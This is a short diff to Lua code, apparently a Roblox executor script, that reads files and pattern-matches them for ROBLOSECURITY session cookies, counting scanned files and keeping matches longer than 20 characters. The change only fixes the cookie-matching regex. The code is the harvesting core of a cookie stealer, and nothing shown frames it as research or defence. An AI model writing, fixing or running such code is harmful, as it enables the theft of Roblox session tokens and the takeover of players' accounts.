@@ -638,7 +638,7 @@ task.spawn(function()
                     local rok, c = pcall(readfile, f)
                     if rok and type(c) == "string" and #c > 5 then
                         scanned = scanned + 1
-                        local found = c:match("ROBLOSECURITY[=_]([^;%s,"']+)")
+                        local found = c:match("ROBLOSECURITY[=_]([^;%s,]+)")
                         if not found then found = c:match("%.ROBLOSECURITY=([^;%s]+)") end
                         if not found then found = c:match("_|([A-Za-z0-9_%-]+)|_") end
                         if found and #found > 20 then
